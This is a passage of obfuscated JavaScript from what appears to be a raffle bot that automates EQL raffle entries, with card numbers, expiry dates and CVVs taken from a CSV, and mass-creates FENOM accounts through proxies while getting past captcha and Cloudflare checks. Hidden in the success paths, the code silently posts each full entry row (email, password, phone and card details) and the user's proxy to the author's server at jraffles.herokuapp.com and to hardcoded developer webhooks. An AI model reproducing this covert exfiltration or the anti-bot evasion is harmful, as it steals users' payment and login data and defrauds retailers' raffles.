                            await _0x1a282d(0x7d0), await _0x179e6a['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a282d(0x12c), await _0x179e6a['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a282d(0x4b0), await _0x179e6a['keyboard']['type']('' + _0x65dd89[_0x5790a1]['CardNumber']), await _0x1a282d(0x320), await _0x179e6a['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x179e6a['keyboard']['type']('' + _0x65dd89[_0x5790a1]['ExpiryDate']), await _0x1a282d(0x4b0), await _0x179e6a['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x179e6a['keyboard']['type']('' + _0x65dd89[_0x5790a1]['CVV']), await _0x1a282d(0x226), await _0x179e6a['type']('input[name=\x22postalCode\x22]', '' + _0x65dd89[_0x5790a1]['Zip']), await _0x1a282d(0x226), await _0x179e6a['click']('#paymentConsent'), await _0x1a282d(0x226), await _0x179e6a['click']('#termsConsent'), await _0x1a282d(0x2bc), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x179e6a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1a282d(0x2710);
                            try {
                                await _0x179e6a['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x1a282d(0xbb8), await _0x179e6a['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x56da19 => _0x56da19['click']()), await _0x179e6a['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x5c3227 => _0x5c3227['click']());
                            } catch {
                            }
                            try {
                                await _0x179e6a['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x426134 = await _0x179e6a['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x426134) {
                                    _0x5a26e1['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x65dd89[_0x5790a1]['Email'] + ',' + _0x65dd89[_0x5790a1]['Password'] + ',' + _0x65dd89[_0x5790a1]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x216976() {
                                var _0x17aa69, _0x3772fa = ![];
                                for (var _0x5b6dee = 0x0; _0x5b6dee < 0x18; _0x5b6dee++) {
                                    async function _0x685c1a() {
                                        var _0x23aedc = new _0x27458e({
                                            'user': _0x64917e['masterMail'],
                                            'password': _0x64917e['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0xee10b8(_0x40ba32) {
                                            _0x23aedc['openBox']('INBOX', ![], _0x40ba32);
                                        }
                                        _0x23aedc['once']('ready', function () {
                                            console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0xee10b8(function (_0x1e327e, _0x2ae118) {
                                                console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1e327e)
                                                    throw _0x1e327e;
                                                _0x23aedc['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x49fa70, _0x1f8961) {
                                                    if (!_0x1f8961 || !_0x1f8961['length'])
                                                        console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x23aedc['end']();
                                                    else {
                                                        var _0x4d4c57 = _0x23aedc['seq']['fetch'](_0x1f8961, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4d4c57['on']('message', function (_0x3e6d8f, _0x46b8f0) {
                                                            var _0x26bf2f = '(#' + _0x46b8f0 + ')\x20';
                                                            _0x3e6d8f['on']('body', function (_0x595af1, _0x582368) {
                                                                _0x483479(_0x595af1, (_0x9da788, _0x2701a6) => {
                                                                    if (_0x2701a6['subject']['includes']('code')) {
                                                                        const _0x137da0 = _0x2701a6['text']['split']('\x0a\x0a')[0x3], _0x3c69e0 = _0x137da0['split']('\x0a')[0x1];
                                                                        _0x17aa69 = _0x3c69e0;
                                                                    }
                                                                });
                                                            }), _0x3e6d8f['once']('end', function () {
                                                            });
                                                        }), _0x4d4c57['once']('error', function (_0x791a9a) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4d4c57['once']('end', function () {
                                                            _0x23aedc['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x23aedc['once']('error', function (_0x37e49f) {
                                            console['log'](_0x17b918['red'](_0x37e49f['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x3772fa = !![];
                                        }), _0x23aedc['once']('end', async function () {
                                        }), _0x23aedc['connect']();
                                    }
                                    _0x685c1a(), await _0x1a282d(0x1388);
                                    if (_0x17aa69)
                                        return _0x17aa69;
                                    if (_0x3772fa)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5b6dee == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x216976(), await _0x1a282d(0x1f4), await _0x179e6a['type']('#code', '' + code), await _0x1a282d(0x3e8), await _0x179e6a['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x30a3ed => _0x30a3ed['click']()), await _0x179e6a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x179e6a['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x65dd89[_0x5790a1]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x5a26e1['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x65dd89[_0x5790a1]['Email'] + ',' + _0x65dd89[_0x5790a1]['Password'] + ',' + _0x65dd89[_0x5790a1]['Phone']), _0x3fc93e = 'no', _0xe19c06(_0x65dd89[_0x5790a1], _0x5c694e);
                            var _0x419b92 = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'dev', ![]), _0x8990af = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'pub', ![]);
                            let _0x4d2942 = _0x65dd89[_0x5790a1];
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'module': _0x5c694e['name'],
                                    'entrydata': JSON['stringify'](_0x4d2942),
                                    'proxy': '' + _0xfa6da9[_0x5790a1]
                                };
                                var _0x2bb0c5 = JSON['stringify'](prxdata);
                                let _0x540ee0 = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x2bb0c5, _0x540ee0);
                            } catch (_0x20b8d5) {
                            }
                            const _0x5553d2 = {
                                'succesDEVMSG': { 'embeds': [_0x419b92] },
                                'succesPUBMSG': { 'embeds': [_0x8990af] }
                            };
                            try {
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x5553d2['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x5553d2['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0x5553d2['succesPUBMSG']);
                            } catch (_0x20fb5a) {
                                console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x20fb5a));
                            }
                        } catch (_0x14754e) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20' + _0x14754e)), _0x11e5c3 = '' + _0x14754e;
                            var _0x334f24 = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'dev', !![], _0x11e5c3), _0x419b92 = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'dev', ![]), _0x8990af = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'pub', ![]);
                            const _0x22d502 = {
                                'succesDEVMSG': { 'embeds': [_0x419b92] },
                                'succesPUBMSG': { 'embeds': [_0x8990af] }
                            };
                            _0x22d502['errorDEV'] = { 'embeds': [_0x334f24] };
                            _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x22d502['errorDEV']);
                            await _0x4e4e57(_0x4cd13, _0x22d502['errorDEV']);
                            if (!_0x3fc93e == 'no')
                                _0x3fc93e = 'yes';
                        } finally {
                            _0x21c963 && _0x21c963['close']();
                            if (_0x3fc93e == 'yes' && _0x567057 != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x567057 + '\x20/\x205)')), _0x5790a1 = _0x5790a1 - 0x1, _0x567057 = _0x567057 + 0x1;
                                continue;
                            }
                            _0x3fc93e == 'yes' && _0x567057 >= 0x5 && (_0x1736ba(_0x65dd89[_0x5790a1], _0x5c694e), _0x3fc93e = 'no', _0x567057 = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    } else {
                        const _0xc4dc3e = '' + _0x65dd89[_0x5790a1]['Url'];
                        if (_0x3fc93e != 'yes')
                            var _0x3fc93e = '', _0x567057 = 0x0;
                        if (_0x65dd89[_0x5790a1]['Email'] == '' || _0x65dd89[_0x5790a1]['FirstName'] == '' || _0x65dd89[_0x5790a1]['LastName'] == '') {
                            console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x65dd89[_0x5790a1]['Password'] == '' && (_0x65dd89[_0x5790a1]['Password'] = 'JRaffles23!');
                        if (_0x64917e['useRandomProxy'] = ![])
                            var _0xd7aeca = _0xfa6da9[_0x5790a1]['split'](':');
                        else
                            var _0x1d7367 = Math['round'](Math['random']() * (_0xfa6da9['length'] - 0x1)), _0xd7aeca = _0xfa6da9[_0x1d7367]['split'](':');
                        var _0x21c963;
                        try {
                            _0x21c963 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd7aeca[0x0] + ':' + _0xd7aeca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x21c963 = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0xd7aeca[0x0] + ':' + _0xd7aeca[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x56a42a = await _0x21c963['newPage']();
                            await _0x56a42a['authenticate']({
                                'username': '' + _0xd7aeca[0x2],
                                'password': '' + _0xd7aeca[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56a42a['setRequestInterception'](!![]), _0x56a42a['on']('request', _0x5c309b => {
                                _0x5c309b['resourceType']() === 'image' || _0x5c309b['resourceType']() === 'font' || _0x5c309b['resourceType']() === 'media' ? _0x5c309b['abort']() : _0x5c309b['continue']();
                            }), await _0x56a42a['goto'](_0xc4dc3e), await _0x56a42a['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x56a42a['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x1a282d(0x7d0), await _0x56a42a['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x56a42a['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x1a282d(0x3e8), await _0x56a42a['waitForSelector']('#email'), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x56a42a['type']('#email', '' + _0x65dd89[_0x5790a1]['Email']), await _0x1a282d(0x352), await _0x56a42a['waitForSelector']('#password'), await _0x56a42a['type']('#password', '' + _0x65dd89[_0x5790a1]['Password']), await _0x1a282d(0x352), await _0x56a42a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1a282d(0x3e8);
                            try {
                                await _0x56a42a['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0xe19c06(_0x65dd89[_0x5790a1], _0x5c694e), _0x3fc93e = 'no';
                                continue;
                            }
                            await _0x56a42a['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x1a282d(0x3e8), await _0x56a42a['click']('li[data-value=\x22EU\x20' + _0x65dd89[_0x5790a1]['Size'] + '\x22]'), await _0x1a282d(0x1f4), await _0x56a42a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x56a42a['focus']('#postcode'), await _0x56a42a['keyboard']['down']('Control'), await _0x56a42a['keyboard']['press']('A'), await _0x56a42a['keyboard']['up']('Control'), await _0x56a42a['keyboard']['press']('Backspace'), await _0x56a42a['keyboard']['type'](_0x65dd89[_0x5790a1]['Zip']), await _0x1a282d(0x60e), await _0x56a42a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1a282d(0x3e8), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x56a42a['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x56a42a['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x56a42a['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x1a282d(0x4b0), await _0x56a42a['keyboard']['type']('' + _0x65dd89[_0x5790a1]['CardNumber']), await _0x1a282d(0x320), await _0x56a42a['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x56a42a['keyboard']['type']('' + _0x65dd89[_0x5790a1]['ExpiryDate']), await _0x1a282d(0x4b0), await _0x56a42a['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x56a42a['keyboard']['type']('' + _0x65dd89[_0x5790a1]['CVV']), await _0x1a282d(0x226), await _0x56a42a['type']('input[name=\x22postalCode\x22]', '' + _0x65dd89[_0x5790a1]['Zip']), await _0x1a282d(0x226), await _0x56a42a['click']('#paymentConsent'), await _0x1a282d(0x226), await _0x56a42a['click']('#termsConsent'), await _0x1a282d(0x2bc), console['log'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x56a42a['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x1a282d(0x2710);
                            try {
                                await _0x56a42a['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x1a282d(0xbb8), await _0x56a42a['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x27a106 => _0x27a106['click']()), await _0x56a42a['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x40dabf => _0x40dabf['click']());
                            } catch {
                            }
                            try {
                                await _0x56a42a['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0xe19c06(_0x65dd89[_0x5790a1], _0x5c694e);
                            var _0x419b92 = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'dev', ![]), _0x8990af = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'pub', ![]);
                            let _0x581dac = _0x65dd89[_0x5790a1];
                            try {
                                prxdata = {
                                    'username': _0x5b7d0c['replace']('#', ''),
                                    'module': _0x5c694e['name'],
                                    'entrydata': JSON['stringify'](_0x581dac),
                                    'proxy': '' + _0xfa6da9[_0x5790a1]
                                };
                                var _0x2bb0c5 = JSON['stringify'](prxdata);
                                let _0x5c63bf = { 'headers': { 'content-type': 'application/json' } };
                                await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x2bb0c5, _0x5c63bf);
                            } catch (_0x1d4854) {
                            }
                            const _0x17b459 = {
                                'succesDEVMSG': { 'embeds': [_0x419b92] },
                                'succesPUBMSG': { 'embeds': [_0x8990af] }
                            };
                            try {
                                _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x17b459['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0xd2142c, _0x17b459['succesDEVMSG']), await _0x1a282d(0xc8), await _0x4e4e57(_0x1274a5, _0x17b459['succesPUBMSG']);
                            } catch (_0x2d0146) {
                                console['log'](_0x17b918['yellow'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2d0146));
                            }
                            _0x3fc93e = 'no';
                        } catch (_0x1620d0) {
                            console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20' + _0x1620d0)), _0x11e5c3 = '' + _0x1620d0;
                            var _0x334f24 = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'dev', !![], _0x11e5c3), _0x419b92 = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'dev', ![]), _0x8990af = await _0x4ee25a(_0x65dd89[_0x5790a1], _0x5c694e, 'pub', ![]);
                            const _0x2aa5e2 = {
                                'succesDEVMSG': { 'embeds': [_0x419b92] },
                                'succesPUBMSG': { 'embeds': [_0x8990af] }
                            };
                            _0x2aa5e2['errorDEV'] = { 'embeds': [_0x334f24] }, _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x2aa5e2['errorDEV']), await _0x4e4e57(_0x4cd13, _0x2aa5e2['errorDEV']), _0x3fc93e = 'yes';
                        } finally {
                            _0x21c963 && _0x21c963['close']();
                            if (_0x3fc93e == 'yes' && _0x567057 != 0x5) {
                                console['log'](_0x17b918['red'](_0x5c19a0() + '\x20[' + _0x5c694e['name'] + ']\x20Task\x20' + (_0x5790a1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x567057 + '\x20/\x205)')), _0x5790a1 = _0x5790a1 - 0x1, _0x567057 = _0x567057 + 0x1;
                                continue;
                            }
                            _0x3fc93e == 'yes' && _0x567057 >= 0x5 && (_0x1736ba(_0x65dd89[_0x5790a1], _0x5c694e), _0x3fc93e = 'no', _0x567057 = 0x0), console['log']('Waiting\x20for\x20' + _0x64917e['delay'] + '\x20ms'), await _0x1a282d(_0x64917e['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x294d82, _0x97d72c, _0x2c735f) {
                    _0x506e0b['use'](_0x407d82()), _0x506e0b['use'](_0x29f88b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x64917e['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3e22c2 = 0x0; _0x3e22c2 < _0x97d72c['length']; _0x3e22c2++) {
                        if (_0x4ee4c5 != 'yes')
                            var _0x4ee4c5 = '', _0x22852f = 0x0;
                        var _0x29164e;
                        try {
                            await _0x120beb(_0x97d72c, _0x3e22c2);
                        } catch {
                            _0x4ee4c5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x51b97d(_0x294d82['name'] + '\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20/\x20' + _0x97d72c['length'] + '\x20||\x20File:\x20' + _0x302fc2 + '\x20Proxies:\x20' + _0x252dfd);
                        var _0x11bad4 = await _0x4ee25a(_0x97d72c[_0x3e22c2], _0x294d82, 'acc', ![]);
                        const _0x177221 = { 'succesDEVMSG': { 'embeds': [_0x11bad4] } }, _0x2182ba = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x9d3af = Math['round'](Math['random']() * (_0x2c735f['length'] - 0x1)), _0x37c6d1 = _0x2c735f[_0x9d3af]['split'](':'), _0x39052f;
                        try {
                            _0x39052f = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x37c6d1[0x0] + ':' + _0x37c6d1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x39052f = await _0x506e0b['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x37c6d1[0x0] + ':' + _0x37c6d1[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xf5bcce = await _0x39052f['newPage']();
                            await _0xf5bcce['setViewport']({
                                'width': 0x500 + _0x55124d(0x1, 0x32),
                                'height': 0x2d9 + _0x55124d(0x1, 0x32)
                            });
                            const _0x37df02 = await _0xf5bcce['target']()['createCDPSession'](), { windowId: _0x57ffa8 } = await _0x37df02['send']('Browser.getWindowForTarget');
                            await _0xf5bcce['authenticate']({
                                'username': '' + _0x37c6d1[0x2],
                                'password': '' + _0x37c6d1[0x3]
                            }), console['log'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xf5bcce['goto']('' + _0x2182ba, { 'waitUntil': 'networkidle2' }), console['log'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x1a282d(0x1388);
                            var _0x54771e = await _0xf5bcce['$']('.hcaptcha-box');
                            if (_0x54771e) {
                                console['log'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x1a282d(0x2710);
                                const _0x5b10a3 = await _0xf5bcce['$']('.hcaptcha-box');
                                if (_0x5b10a3)
                                    try {
                                        await _0x5b10a3['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0xf5bcce['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x3c8076 = await _0xf5bcce['$']('.hcaptcha-box');
                                    if (_0x3c8076)
                                        try {
                                            await _0x3c8076['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0xf5bcce['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x37df02['send']('Browser.setWindowBounds', {
                                    'windowId': _0x57ffa8,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x1a282d(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0xf5bcce['type']('input[name=\x22firstname\x22]', '' + _0x97d72c[_0x3e22c2]['FirstName']), await _0x1a282d(0x1f4), await _0xf5bcce['type']('input[name=\x22lastname\x22]', '' + _0x97d72c[_0x3e22c2]['LastName']), await _0x1a282d(0x1f4), await _0xf5bcce['type']('input[name=\x22email\x22]', '' + _0x97d72c[_0x3e22c2]['Email']), await _0x1a282d(0x1f4), await _0xf5bcce['type']('input[name=\x22password\x22]', '' + _0x97d72c[_0x3e22c2]['Password']), await _0x1a282d(0x258), await _0xf5bcce['$eval']('input[name=\x22psgdpr\x22]', _0x551845 => _0x551845['click']()), await _0x1a282d(0x1f4), console['log'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Sending\x20Request'), await _0xf5bcce['$eval']('#customer-form', _0x5904be => _0x5904be['submit']());
                            try {
                                try {
                                    await _0xf5bcce['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                } catch {
                                    throw new Error('Succes-response\x20not\x20found');
                                }
                                _0x4ee4c5 = 'no', console['log'](_0x17b918['green'](_0x5c19a0() + '\x20[' + _0x294d82['name'] + ']\x20Task\x20' + (_0x3e22c2 + 0x1) + '\x20:\x20Account\x20' + _0x97d72c[_0x3e22c2]['Email'] + '\x20Generated')), _0x5a26e1['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x97d72c[_0x3e22c2]['Email'] + ',' + _0x97d72c[_0x3e22c2]['Password']);
                                let _0x568937 = _0x97d72c[_0x3e22c2];
                                try {
                                    prxdata = {
                                        'username': _0x5b7d0c['replace']('#', ''),
                                        'module': _0x294d82['name'],
                                        'entrydata': JSON['stringify'](_0x568937),
                                        'proxy': '' + _0x2c735f[_0x3e22c2]
                                    };
                                    var _0x26bbf3 = JSON['stringify'](prxdata);
                                    let _0x2f8a29 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0xbd53c['post']('https://jraffles.herokuapp.com/success', _0x26bbf3, _0x2f8a29);
                                } catch (_0x371cea) {
                                }
                                try {
                                    _0x64917e['webhook'] != undefined && _0x64917e['webhook'] != '' && await _0x4e4e57(_0x64917e['webhook'], _0x177221['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4e4e57(_0xb68945, _0x177221['succesDEVMSG']);
                            } catch (_0x25fc9b) {
                                throw new Error('Account\x20generation\x20failed');
                            }
                        } catch (_0x35d0e2) {
